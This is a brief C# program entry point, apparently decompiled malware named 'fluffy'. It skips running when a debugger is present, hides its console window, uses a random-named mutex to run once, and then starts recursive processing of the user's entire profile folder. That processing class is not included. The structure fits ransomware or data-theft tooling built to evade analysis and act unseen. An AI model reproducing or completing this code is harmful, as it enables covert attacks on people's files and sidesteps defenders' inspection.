using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;

namespace fluffy;

internal class Program
{
	private static Mutex _Mutex;

	private static bool CreatedNew;

	private const int SW_HIDE = 0;

	private static async Task Main(string[] args)
	{
		if (!IsDebuggerPresent())
		{
			ShowWindow(GetConsoleWindow(), 0);
			_Mutex = new Mutex(initiallyOwned: true, "yMtxqz8ES8gXDFZSe6m1REUb8xddAxLz", out CreatedNew);
			if (CreatedNew)
			{
				await RecursiveFileProcessor.Initiate(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile));
			}
		}
	}

	[DllImport("kernel32.dll")]
	private static extern bool IsDebuggerPresent();

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetConsoleWindow();

	[DllImport("user32.dll")]
	private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}
